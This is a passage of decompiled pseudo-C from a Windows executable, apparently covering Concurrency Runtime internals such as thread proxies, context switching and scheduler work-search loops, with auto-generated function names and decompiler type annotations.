    sub_441D3C((_DWORD *)this);
  }
  else
  {
    _InterlockedExchange((volatile __int32 *)(this + 84), *(_DWORD *)(this + 80));
    sub_441CB2((_DWORD **)this);
    sub_44246B(v3);
  }
  return 1;
}
// 488F48: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (00441F1F) --------------------------------------------------------
int __thiscall sub_441F1F(_DWORD *this)
{
  unsigned int v2; // eax
  unsigned int v3; // eax

  v2 = (unsigned int)sub_430184(*(_DWORD *)(*(_DWORD *)(this[7] + 12) + 112));
  if ( v2 && (v2 & 3) == 1 && (v3 = v2 & 0xFFFFFFFE) != 0 && v3 == this[20] )
    *(_DWORD *)(v3 + 16) = 0;
  else
    sub_44207B(this);
  return (*(int (__thiscall **)(_DWORD *, int))(*this + 32))(this, 1);
}

//----- (00441F6D) --------------------------------------------------------
_BYTE *__thiscall sub_441F6D(_DWORD *this, int a2)
{
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !this[20] || this[20] != (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2) )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  return sub_43242D(*(_DWORD **)(this[7] + 12));
}
// 488F48: using guessed type __TI_flags _TI2_AVinvalid_operation_Concurrency__;

//----- (00441FD8) --------------------------------------------------------
__int32 __thiscall sub_441FD8(int this, int a2)
{
  int v3; // edi
  __int32 result; // eax
  int v5; // ebx

  v3 = *(_DWORD *)(this + 80);
  result = _InterlockedDecrement((volatile signed __int32 *)(this + 76));
  if ( result > 0 )
  {
    v5 = sub_441D3C((_DWORD *)this);
    result = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 8))(v5);
    if ( v3 != result )
      return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 4))(v3, v5, a2);
  }
  else
  {
    if ( !result )
      result = sub_441CB2((_DWORD **)this);
    *(_DWORD *)(this + 80) = 0;
    if ( a2 == 1 )
      return sub_44246B(v3);
  }
  return result;
}

//----- (00442045) --------------------------------------------------------
int __thiscall sub_442045(int this, int a2, __int16 a3, int a4)
{
  int result; // eax

  if ( !sub_441CF2((_WORD *)(this + 48), (int)&a2) )
    sub_430B71((DWORD_PTR *)&a2, *(HANDLE *)(this + 8));
  *(_WORD *)(this + 52) = a3;
  result = a2;
  *(_DWORD *)(this + 48) = a2;
  return result;
}

//----- (0044207B) --------------------------------------------------------
char __thiscall sub_44207B(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  v5 = sub_43051F;
  v4 = 0;
  while ( this[20] && !this[21] )
    result = sub_42E8F5((int)v3);
  return result;
}
// 44207B: using guessed type char var_10[8];

//----- (004420A9) --------------------------------------------------------
int __thiscall sub_4420A9(_DWORD *this, int a2)
{
  this[16] = a2;
  return (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 12))(a2, this);
}

//----- (004420CC) --------------------------------------------------------
void __fastcall sub_4420CC(int a1)
{
  DWORD v2; // eax
  int v3; // esi
  void *v4; // [esp-4h] [ebp-18h]
  int v5[2]; // [esp+Ch] [ebp-8h] BYREF

  v5[1] = 0;
  v5[0] = 8;
  if ( !*(_DWORD *)(a1 + 36) )
  {
    v4 = (void *)(a1 | 1);
    v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 4) + 16))(*(_DWORD *)(a1 + 4));
    sub_430192(v2, v4);
    while ( !*(_DWORD *)(a1 + 36) )
    {
      (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(a1 + 64) + 12))(*(_DWORD *)(a1 + 64), a1);
      (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 64) + 16))(*(_DWORD *)(a1 + 64), v5);
      v3 = *(_DWORD *)(a1 + 16);
      *(_DWORD *)(a1 + 64) = 0;
      *(_DWORD *)(a1 + 16) = 0;
      sub_442172(a1);
      if ( v3 )
        sub_441FD8(v3, 1);
      else
        sub_44246B(a1);
    }
  }
}

//----- (00442172) --------------------------------------------------------
int __thiscall sub_442172(int this)
{
  *(_DWORD *)(this + 64) = 0;
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4), this);
}

//----- (00442190) --------------------------------------------------------
__int32 __thiscall sub_442190(_DWORD *this, int a2)
{
  int v2; // edx
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( !a2 )
    goto LABEL_8;
  v2 = this[4];
  if ( !v2 )
  {
    if ( a2 == 1 )
      return sub_44246B((int)this);
LABEL_8:
    sub_429626((std::exception *)pExceptionObject, "switchState");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a2 == 2 )
    this[4] = 0;
  return sub_441FD8(v2, a2);
}

//----- (004421E1) --------------------------------------------------------
__int32 __thiscall sub_4421E1(int this, int a2, int a3)
{
  int v4; // edi
  int (__thiscall ***v5)(void *); // edx
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_429626((std::exception *)pExceptionObject, "pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( !v4 )
    v4 = (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(*(_DWORD *)(this + 16) + 28) + 28))(
           *(_DWORD *)(*(_DWORD *)(this + 16) + 28),
           a2);
  v5 = *(int (__thiscall ****)(void *))(this + 16);
  *(_DWORD *)(this + 16) = 0;
  if ( a3 == 1 )
    _InterlockedExchange((volatile __int32 *)(this + 32), 1);
  sub_441E2A(v5, (int (__thiscall **)(void *))v4);
  if ( a3 != 1 )
    return sub_44241E((HANDLE *)v4);
  sub_43010E(*(HANDLE *)(v4 + 12), *(HANDLE *)(this + 12), 0xFFFFFFFF, 1);
  return _InterlockedExchange((volatile __int32 *)(this + 32), 0);
}

//----- (00442298) --------------------------------------------------------
LPVOID __thiscall sub_442298(_DWORD *this, int a2, int a3)
{
  int *v3; // edi
  int v4; // eax
  LPVOID v5; // esi
  int v6; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-14h] BYREF
  LPVOID lpParameter; // [esp+1Ch] [ebp-4h]

  this[1] = a2;
  this[5] = a3;
  *this = &Concurrency::details::ThreadProxy::`vftable';
  v3 = (int *)this[1];
  this[6] = 0;
  *((_BYTE *)this + 28) = 0;
  this[8] = 1;
  this[9] = 0;
  v4 = *v3;
  lpParameter = this;
  (*(void (__thiscall **)(int *))(v4 + 8))(v3);
  v5 = lpParameter;
  *((_DWORD *)lpParameter + 10) = _InterlockedIncrement(&dword_48C350);
  *((_DWORD *)v5 + 3) = sub_42FD5D(0);
  v6 = sub_4302F6(0, *((_DWORD *)v5 + 5) << 10, (LPTHREAD_START_ROUTINE)sub_442487, v5, 0x10000u, (LPDWORD)v5 + 11);
  *((_DWORD *)v5 + 2) = v6;
  if ( !v6 )
  {
    CloseHandle(*((HANDLE *)v5 + 3));
    (*(void (__thiscall **)(_DWORD))(**((_DWORD **)v5 + 1) + 12))(*((_DWORD *)v5 + 1));
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_43067A(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVscheduler_worker_creation_error_Concurrency__);
  }
  return v5;
}
// 4719E8: using guessed type void *Concurrency::details::ThreadProxy::`vftable';
// 48C350: using guessed type int dword_48C350;
// 442298: using guessed type _DWORD pExceptionObject[4];

//----- (0044236B) --------------------------------------------------------
std::regex_error *__thiscall sub_44236B(std::regex_error *this, struct std::regex_error *a2)
{
  std::regex_error::regex_error(this, a2);
  *(_DWORD *)this = &Concurrency::scheduler_worker_creation_error::`vftable';
  return this;
}
// 470E7C: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (00442386) --------------------------------------------------------
int __thiscall sub_442386(void *this)
{
  void *v3; // [esp-4h] [ebp-1Ch]

  v3 = (void *)*((_DWORD *)this + 3);
  *(_DWORD *)this = &Concurrency::details::ThreadProxy::`vftable';
  CloseHandle(v3);
  sub_42FD4F(*((HANDLE *)this + 2));
  return (*(int (__thiscall **)(_DWORD))(**((_DWORD **)this + 1) + 12))(*((_DWORD *)this + 1));
}
// 4719E8: using guessed type void *Concurrency::details::ThreadProxy::`vftable';

//----- (004423E7) --------------------------------------------------------
void *__thiscall sub_4423E7(void *Block, char a2)
{
  sub_442386(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00442409) --------------------------------------------------------
BOOL __thiscall sub_442409(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-4h]

  v2 = (void *)this[3];
  this[9] = 1;
  return SetEvent(v2);
}

//----- (0044241A) --------------------------------------------------------
int __thiscall sub_44241A(_DWORD *this)
{
  return this[10];
}

//----- (0044241E) --------------------------------------------------------
BOOL __thiscall sub_44241E(HANDLE *this)
{
  return SetEvent(this[3]);
}

//----- (00442428) --------------------------------------------------------
BOOL __thiscall sub_442428(_DWORD *this, int nPriority)
{
  void *v3; // [esp-8h] [ebp-8h]

  v3 = (void *)this[2];
  this[6] = nPriority;
  return sub_4300CC(v3, nPriority);
}

//----- (00442440) --------------------------------------------------------
char __thiscall sub_442440(_DWORD *this)
{
  char result; // al
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  if ( !this[8] )
  {
    v4 = 0;
    v5 = sub_43051F;
    do
      result = sub_42E8F5((int)v3);
    while ( !this[8] );
  }
  return result;
}
// 442440: using guessed type char var_10[8];

//----- (0044246B) --------------------------------------------------------
__int32 __thiscall sub_44246B(int this)
{
  volatile __int32 *v1; // esi

  v1 = (volatile __int32 *)(this + 32);
  _InterlockedExchange((volatile __int32 *)(this + 32), 1);
  WaitForSingleObjectEx(*(HANDLE *)(this + 12), 0xFFFFFFFF, 0);
  return _InterlockedExchange(v1, 0);
}

//----- (00442487) --------------------------------------------------------
int __stdcall sub_442487(LPVOID lpThreadParameter)
{
  WaitForSingleObjectEx(*((HANDLE *)lpThreadParameter + 3), 0xFFFFFFFF, 0);
  _InterlockedExchange((volatile __int32 *)lpThreadParameter + 8, 0);
  (*(void (__thiscall **)(LPVOID))(*(_DWORD *)lpThreadParameter + 20))(lpThreadParameter);
  (*(void (__thiscall **)(LPVOID, int))(*(_DWORD *)lpThreadParameter + 16))(lpThreadParameter, 1);
  sub_430280(0);
  return 0;
}

//----- (004424D7) --------------------------------------------------------
int *__thiscall sub_4424D7(int *this, int a2, int a3, int a4, int a5)
{
  *this = a2 & 0xFFFFFFF;
  this[1] = a4;
  this[3] = a5;
  this[2] = a3;
  return this;
}

//----- (004424FC) --------------------------------------------------------
bool __thiscall sub_4424FC(unsigned int *this, int a2)
{
  _DWORD *v2; // esi
  int v3; // eax

  v2 = this + 4;
  v3 = sub_4364AB((int)&a2, this[4]);
  return sub_436C0C(v2, &a2, v3) != 0;
}

//----- (00442526) --------------------------------------------------------
char __thiscall sub_442526(int this, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v6; // eax

  v2 = *a2 & 0xFFFFFFF;
  if ( !v2 )
    return 1;
  v3 = v2 - 1;
  if ( !v3 )
  {
    v6 = *(_DWORD *)(*(_DWORD *)(this + 12) + 44);
    return v6 == a2[2];
  }
  v4 = v3 - 1;
  if ( !v4 )
  {
    v6 = *(_DWORD *)(this + 8);
    return v6 == a2[2];
  }
  return v4 == 1 && sub_4424FC(*(unsigned int **)(this + 12), a2[2]);
}

//----- (00442571) --------------------------------------------------------
bool __thiscall sub_442571(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v6; // eax

  v2 = *a2 & 0xFFFFFFF;
  if ( !v2 )
    return 1;
  v3 = v2 - 1;
  if ( v3 )
  {
    v4 = v3 - 1;
    if ( v4 )
    {
      if ( v4 != 1 )
        return 0;
      v6 = this[2];
    }
    else
    {
      v6 = *(_DWORD *)(*(_DWORD *)(this[3] + 80) + 48);
    }
  }
  else
  {
    v6 = *(_DWORD *)(*(_DWORD *)(this[3] + 80) + 44);
  }
  return v6 == a2[2];
}

//----- (004425BD) --------------------------------------------------------
_DWORD *__thiscall sub_4425BD(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  *this = 1;
  this[1] = sub_41DA9B((_DWORD *)(a2 + 4));
  result = this;
  this[2] = a2;
  return result;
}

//----- (004425E3) --------------------------------------------------------
unsigned __int32 __thiscall sub_4425E3(_DWORD *this, int a2)
{
  unsigned __int32 v3; // edx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  if ( *(_DWORD *)((a2 << 7) + this[23]) <= 1u )
    return 0;
  savedregs = (int)&savedregs;
  v3 = *(_DWORD *)((a2 << 7) + this[23]);
  if ( v3 > 1 && v3 == _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 1, v3) )
    return v3;
  else
    return 0;
}

//----- (00442634) --------------------------------------------------------
int __thiscall sub_442634(int *this)
{
  int v3; // eax

  if ( (*(_BYTE *)this & 0x18) != 0 && !sub_442CA4(this) )
    return 0;
  if ( *this == 2 )
  {
    v3 = sub_44020A((_DWORD *)this[1], this[2], 0);
LABEL_8:
    this[2] = v3;
    if ( v3 )
    {
      *(_BYTE *)(v3 + 179) |= 1u;
      *this = 1;
    }
    return this[2];
  }
  if ( *this == 4 )
  {
    v3 = sub_44020A((_DWORD *)this[1], this[2], 1);
    goto LABEL_8;
  }
  return this[2];
}

//----- (00442681) --------------------------------------------------------
int __thiscall sub_442681(_DWORD *this, int a2)
{
  int result; // eax

  if ( *this == 2 )
  {
    result = sub_43EAA5(a2, this[1], this[2], 0);
  }
  else
  {
    result = *this - 4;
    if ( *this == 4 )
      result = sub_43EAA5(a2, this[1], this[2], 1);
  }
  this[2] = a2;
  *this = 1;
  return result;
}

//----- (004426BB) --------------------------------------------------------
char __thiscall sub_4426BB(_QWORD *this, __int64 a2)
{
  char result; // al

  if ( (unsigned __int64)(a2 - this[3]) <= 0x3E8 )
    return 0;
  result = 1;
  this[3] = a2;
  return result;
}

//----- (004426F1) --------------------------------------------------------
char __thiscall sub_4426F1(_DWORD *this, _DWORD *a2, int *a3, char a4)
{
  int v5; // eax
  _DWORD *v6; // eax
  int v8; // eax
  _DWORD *v9; // eax
  _DWORD v10[3]; // [esp+Ch] [ebp-Ch] BYREF

  if ( !a4 )
  {
    if ( this[3] < 0x65u )
    {
      if ( a3[5] - a3[4] > 0 )
      {
        v8 = sub_43D0F4(a3 + 4);
LABEL_11:
        if ( v8 )
        {
          v9 = sub_4425BD(v10, v8);
          *a2 = *v9;
          a2[1] = v9[1];
          a2[2] = v9[2];
          ++this[3];
          return 1;
        }
      }
    }
    else if ( this[3] < 0x7Fu )
    {
      v8 = sub_443A7E(a3);
      goto LABEL_11;
    }
    this[3] = 0;
    return 0;
  }
  if ( a3[5] - a3[4] > 0 )
  {
    v5 = sub_43D0F4(a3 + 4);
    if ( v5 )
    {
      v6 = sub_4425BD(v10, v5);
      *a2 = *v6;
      a2[1] = v6[1];
      a2[2] = v6[2];
      return 1;
    }
  }
  return 0;
}
// 4426F1: using guessed type _DWORD var_C[3];

//----- (00442780) --------------------------------------------------------
int __thiscall sub_442780(_DWORD *this, int *a2, int a3)
{
  int v3; // edi
  int i; // esi
  int v5; // edx
  int result; // eax

  v3 = this[11];
  for ( i = 0; i < v3; ++i )
  {
    v5 = (i + *a2 + (a3 != -1)) % v3;
    if ( v5 == a3 )
      break;
    result = *(_DWORD *)(this[8] + 4 * v5);
    if ( result )
    {
      *a2 = v5;
      return result;
    }
  }
  return 0;
}

//----- (004427CD) --------------------------------------------------------
int __thiscall sub_4427CD(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v3; // edi
  int result; // eax

  v2 = this + 4;
  v3 = this[44];
  result = sub_435BFA(v3, this[20], a2, this + 4);
  if ( !result )
  {
    if ( v3 )
      return sub_435BFA(0, v3, a2, v2);
  }
  return result;
}

//----- (00442808) --------------------------------------------------------
int __thiscall sub_442808(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v3; // edi
  int result; // eax

  v2 = this + 24;
  v3 = this[45];
  result = sub_435BFA(v3, this[40], a2, this + 24);
  if ( !result )
  {
    if ( v3 )
      return sub_435BFA(0, v3, a2, v2);
  }
  return result;
}

//----- (00442846) --------------------------------------------------------
char __stdcall sub_442846(_DWORD *a1, int *a2, char a3)
{
  int v3; // eax
  char result; // al
  int v5; // [esp+Ch] [ebp-4h]

  if ( a3 )
  {
    v3 = sub_44023D(a2);
    if ( v3 )
    {
      *a1 = 2;
      a1[1] = a2;
      a1[2] = v3;
      return 1;
    }
  }
  else if ( sub_440297(a2) )
  {
    result = 1;
    *a1 = 8;
    a1[1] = a2;
    a1[2] = v5;
    return result;
  }
  return 0;
}
// 442892: variable 'v5' is possibly undefined

//----- (0044289D) --------------------------------------------------------
char __thiscall sub_44289D(_DWORD *this, _DWORD *a2, int *a3, char a4, int a5, char a6)
{
  int v6; // esi
  int *v8; // esi

  v6 = a3[64];
  if ( !sub_443941(this, (int)a3, 0, a5, a6) && sub_442846(a2, a3, a4) )
    return 1;
  if ( a5 )
    v8 = *(int **)(v6 + 12);
  else
    v8 = *(int **)(v6 + 16);
  while ( v8 )
  {
    if ( !sub_443941(this, (int)v8, (int)a3, a5, a6) && sub_442846(a2, v8, a4) )
      return 1;
    v8 = (int *)v8[65];
  }
  return 0;
}

//----- (0044291E) --------------------------------------------------------
char __stdcall sub_44291E(_DWORD *a1, int a2)
{
  int v2; // eax
  _DWORD *v3; // esi
  char result; // al
  int v5[3]; // [esp+8h] [ebp-Ch] BYREF

  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 12))(a2);
  if ( !v2 )
    return 0;
  v3 = sub_4425BD(v5, v2);
  result = 1;
  *a1 = *v3++;
  a1[1] = *v3;
  a1[2] = v3[1];
  return result;
}
// 44291E: using guessed type int var_C[3];

//----- (0044295B) --------------------------------------------------------
char __thiscall sub_44295B(_DWORD *this, _DWORD *a2, int a3, int a4, char a5)
{
  int v5; // esi
  int v7; // esi

  v5 = *(_DWORD *)(a3 + 256);
  if ( !sub_443941(this, a3, 0, a4, a5) && sub_44291E(a2, a3) )
    return 1;
  if ( a4 )
    v7 = *(_DWORD *)(v5 + 12);
  else
    v7 = *(_DWORD *)(v5 + 16);
  while ( v7 )
  {
    if ( !sub_443941(this, v7, a3, a4, a5) && sub_44291E(a2, v7) )
      return 1;
    v7 = *(_DWORD *)(v7 + 260);
  }
  return 0;
}

//----- (004429D6) --------------------------------------------------------
char __stdcall sub_4429D6(int *a1, int a2, char a3, char a4)
{
  void *v4; // eax
  char result; // al
  int v6; // [esp+8h] [ebp-Ch]
  int v7; // [esp+10h] [ebp-4h]

  if ( a4 )
  {
    v4 = sub_4408DA(a2, a3);
    if ( v4 )
    {
      v6 = 4;
LABEL_4:
      v7 = (int)v4;
      result = 1;
      *a1 = v6;
      a1[1] = a2;
      a1[2] = v7;
      return result;
    }
  }
  else
  {
    v4 = sub_4404A1(a2);
    if ( v4 )
    {
      v6 = 16;
      goto LABEL_4;
    }
  }
  return 0;
}

//----- (00442A29) --------------------------------------------------------
char __thiscall sub_442A29(_DWORD *this, int *a2, int a3, char a4, int a5, char a6)
{
  int v7; // esi
  int v9; // [esp+8h] [ebp-4h]

  v9 = *(_DWORD *)(a3 + 256);
  if ( !sub_443941(this, a3, 0, a5, a6) && sub_4429D6(a2, a3, a6, a4) )
    return 1;
  if ( a5 )
    v7 = *(_DWORD *)(v9 + 12);
  else
    v7 = *(_DWORD *)(v9 + 16);
  while ( v7 )
  {
    if ( !sub_443941(this, v7, a3, a5, a6) && sub_4429D6(a2, v7, a6, a4) )
      return 1;
    v7 = *(_DWORD *)(v7 + 260);
  }
  return 0;
}

//----- (00442AB7) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_442AB7(_DWORD *this)
{
  PSLIST_ENTRY result; // eax

  if ( *this == 2 )
  {
    sub_443AE2(this[2]);
    return sub_4372CA(*(_DWORD *)(*(_DWORD *)(this[1] + 256) + 4), this[2]);
  }
  else
  {
    result = (PSLIST_ENTRY)(*this - 4);
    if ( *this == 4 )
      return (PSLIST_ENTRY)(*(int (__cdecl **)(_DWORD))(this[2] + 12))(this[2]);
  }
  return result;
}

//----- (00442AFA) --------------------------------------------------------
void __thiscall sub_442AFA(int this, signed __int64 a2)
{
  if ( (unsigned __int64)(a2 - *(_QWORD *)(this + 416)) > 0x7D0 )
    sub_436D1E((_DWORD *)this, a2);
}

//----- (00442B33) --------------------------------------------------------
char __thiscall sub_442B33(_DWORD *this, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // esi
  char result; // al
  int v5[3]; // [esp+8h] [ebp-Ch] BYREF

  v2 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*this + 8))(*this);
  if ( !v2 )
    return 0;
  v3 = sub_4425BD(v5, v2);
  result = 1;
  *a2 = *v3++;
  a2[1] = *v3;
  a2[2] = v3[1];
  return result;
}
// 442B33: using guessed type int var_C[3];

//----- (00442B6F) --------------------------------------------------------
bool __stdcall sub_442B6F(int *a1, int *a2, char a3, char a4)
{
  return (a4 & 1) != 0 && sub_44291E(a2, (int)a1)
      || (a4 & 0xA) != 0 && sub_442846(a2, a1, (a4 & 2) != 0)
      || (a4 & 0x14) != 0 && sub_4429D6(a2, (int)a1, a3, (a4 & 4) != 0);
}

//----- (00442BDC) --------------------------------------------------------
bool __stdcall sub_442BDC(int *a1, int *a2, char a3, char a4)
{
  return (a4 & 0x14) != 0 && sub_4429D6(a2, (int)a1, a3, (a4 & 4) != 0)
      || (a4 & 0xA) != 0 && sub_442846(a2, a1, (a4 & 2) != 0)
      || (a4 & 1) != 0 && sub_44291E(a2, (int)a1);
}

//----- (00442C4A) --------------------------------------------------------
__int64 __thiscall sub_442C4A(_DWORD *this, int a2, int a3)
{
  __int64 result; // rax

  this[3] = 0;
  *this = a2;
  this[2] = *(_DWORD *)(a2 + 144);
  this[1] = **(_DWORD **)(a2 + 80);
  result = j____crtGetTickCount64();
  *((_QWORD *)this + 3) = result;
  *((_QWORD *)this + 2) = result;
  if ( a3 == 1 )
  {
    this[8] = sub_442D23;
    this[9] = sub_442FC0;
  }
  else
  {
    this[8] = sub_443527;
    this[9] = sub_44363A;
  }
  return result;
}
// 43001E: using guessed type __int64 j____crtGetTickCount64(void);

//----- (00442CA4) --------------------------------------------------------
bool __thiscall sub_442CA4(void *this)
{
  volatile __int32 *v2; // ecx
  char v3; // al
  int v4; // edi
  int v5; // eax
  _BYTE *v7; // [esp+8h] [ebp-4h] BYREF

  if ( *(_DWORD *)this == 8 )
  {
    v5 = sub_44023D(*((int **)this + 1));
    if ( !v5 )
      return (*(_DWORD *)this & 0x18) == 0;
    *(_DWORD *)this = 2;
    goto LABEL_10;
  }
  if ( *(_DWORD *)this != 16 )
    return (*(_DWORD *)this & 0x18) == 0;
  v2 = (volatile __int32 *)*((_DWORD *)this + 2);
  if ( v2 != (volatile __int32 *)1 )
  {
    v5 = sub_4416A3(v2, 0);
    if ( !v5 )
      return (*(_DWORD *)this & 0x18) == 0;
    *(_DWORD *)this = 4;
LABEL_10:
    *((_DWORD *)this + 2) = v5;
    return (*(_DWORD *)this & 0x18) == 0;
  }
  v3 = sub_43FFE1((volatile signed __int32 *)(*((_DWORD *)this + 1) + 52), &v7);
  v4 = v3 != 0 ? (unsigned int)v7 : 0;
  if ( v4 )
  {
    sub_441A59(v3 != 0 ? v7 : 0, 1);
    *((_DWORD *)this + 2) = v4;
    *(_DWORD *)this = 4;
  }
  return (*(_DWORD *)this & 0x18) == 0;
}

//----- (00442D23) --------------------------------------------------------
char __thiscall sub_442D23(int this, int *a2, int *a3, char a4, char a5)
{
  int *v5; // edi
  signed __int64 TickCount64; // rax
  int v9; // ecx
  int v10; // ecx
  __int32 v11; // eax
  _DWORD *v12; // eax
  int *v13; // eax
  int v14; // ecx
  int v15; // esi
  char v16; // al
  int *v17; // eax
  _DWORD *v18; // ecx
  _DWORD *v19; // esi
  _DWORD *v20; // edi
  _DWORD *v21; // esi
  int v22; // [esp+8h] [ebp-2Ch] BYREF
  int v23[3]; // [esp+Ch] [ebp-28h] BYREF
  int v24; // [esp+18h] [ebp-1Ch]
  _DWORD *v25; // [esp+1Ch] [ebp-18h]
  int v26; // [esp+20h] [ebp-14h]
  int v27; // [esp+24h] [ebp-10h]
  int *v28; // [esp+28h] [ebp-Ch]
  _DWORD *v29; // [esp+2Ch] [ebp-8h]
  char v30; // [esp+33h] [ebp-1h]

  v5 = a2;
  v30 = 0;
  if ( sub_442B33((_DWORD *)this, a2) )
    return 1;
  TickCount64 = j____crtGetTickCount64();
  v9 = *(_DWORD *)(this + 4);
  *(_QWORD *)(this + 16) = TickCount64;
  sub_442AFA(v9, TickCount64);
  if ( sub_4426BB((_QWORD *)this, *(_QWORD *)(this + 16)) )
  {
    v10 = *(_DWORD *)(this + 4);
    if ( *(_DWORD *)(v10 + 304) )
    {
      while ( 1 )
      {
        v12 = (_DWORD *)sub_436156(v10);
        if ( !v12 )
          break;
        if ( *v12 )
        {
          if ( (a5 & 1) != 0 )
          {
            v11 = sub_443A7E(v12 - 53);
            if ( v11 )
            {
              v13 = sub_4425BD(v23, v11);
              *a2 = *v13;
              a2[1] = v13[1];
              a2[2] = v13[2];
              v5 = a2;
LABEL_15:
              v30 = 1;
              break;
            }
          }
        }
        else if ( sub_442B6F(v12 - 68, a2, a4, a5) )
        {
          goto LABEL_15;
        }
        v10 = *(_DWORD *)(this + 4);
      }
    }
    *(_BYTE *)(*(_DWORD *)this + 98) = 1;
  }
  v14 = *(_DWORD *)this;
  v25 = *(_DWORD **)(*(_DWORD *)this + 84);
  if ( v30 )
  {
LABEL_44:
    v19 = (_DWORD *)v5[1];
    v20 = (_DWORD *)v19[2];
    sub_4438F5(v19, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
    v21 = v19 + 3;
    LOBYTE(v26) = 0;
    if ( (*v21 & 0xFFFFFFF) != 0 )
    {
      sub_4380FD(&v22, (_DWORD *)(*(_DWORD *)this + 148));
      if ( sub_442571(&v22, v21) )
        LOBYTE(v26) = 1;
    }
    sub_43D5B5(*(_DWORD *)this, v26, v20 == v25);
  }
  else
  {
    v15 = !*(_BYTE *)(v14 + 96) && !sub_43CB4E(v14) && !a4;
    v16 = v30;
    LOBYTE(v26) = 1;
    while ( v15 <= 2 )
    {
      v27 = dword_471A00[v15];
      v28 = a3;
      v29 = v25;
      if ( v25 )
      {
        while ( 1 )
        {
          v17 = (int *)sub_4425E3(*(_DWORD **)(this + 4), *(_DWORD *)(this + 8));
          if ( v17 )
          {
            if ( sub_442B6F(v17, v5, a4, a5) )
              break;
          }
          if ( (_BYTE)v26 && (a5 & 1) != 0 && sub_4426F1((_DWORD *)this, v5, *(int **)this, 0) )
            break;
          v24 = a5 & 1;
          if ( (a5 & 1) != 0 )
          {
            if ( sub_44331A(this, v5, v29, (int)v28, v26, v27, a5, a4) )
              break;
          }
          if ( (a5 & 0xA) != 0 && sub_44321E(this, v5, v29, v28, (a5 & 2) != 0, v27, a5, a4)
            || (a5 & 0x14) != 0 && sub_443428(this, v5, v29, (int)v28, (a5 & 4) != 0, v27, a5, a4)
            || v24 && v15 == 2 && sub_443A0F(this, v5, (_DWORD *)v29[1], *(int **)this) )
          {
            break;
          }
          v18 = *(_DWORD **)(this + 4);
          v28 = 0;
          LOBYTE(v26) = 0;
          v29 = (_DWORD *)sub_4361C7(v18, (int)v25, (int)v29);
          if ( !v29 )
          {
            v16 = v30;
            goto LABEL_42;
          }
        }
        v30 = 1;
        goto LABEL_44;
      }
LABEL_42:
      ++v15;
      if ( v16 )
      {
        v30 = v16;
        goto LABEL_44;
      }
    }
  }
  return v30;
}
// 43001E: using guessed type __int64 j____crtGetTickCount64(void);
// 471A00: using guessed type int dword_471A00[];
// 442D23: using guessed type int var_28[3];

//----- (00442FC0) --------------------------------------------------------
char __thiscall sub_442FC0(int this, int *a2, int a3, char a4, char a5)
{
  int *v5; // edi
  signed __int64 TickCount64; // rax
  int v9; // ecx
  int v10; // ecx
  __int32 v11; // eax
  _DWORD *v12; // eax
  int *v13; // eax
  int v14; // ecx
  int v15; // esi
  char v16; // al
  int *v17; // edx
  _DWORD *v18; // ecx
  int v19; // eax
  int v20; // eax
  _DWORD *v21; // ecx
  int v22; // eax
  _DWORD *v23; // ecx
  _DWORD *v24; // esi
  int v25[3]; // [esp+8h] [ebp-2Ch] BYREF
  int v26; // [esp+14h] [ebp-20h]
  int v27; // [esp+18h] [ebp-1Ch]
  int v28; // [esp+1Ch] [ebp-18h]
  int v29; // [esp+20h] [ebp-14h]
  _DWORD *v30; // [esp+24h] [ebp-10h]
  int *v31; // [esp+28h] [ebp-Ch]
  _DWORD *v32; // [esp+2Ch] [ebp-8h]
  char v33; // [esp+33h] [ebp-1h]

  v5 = a2;
  v33 = 0;
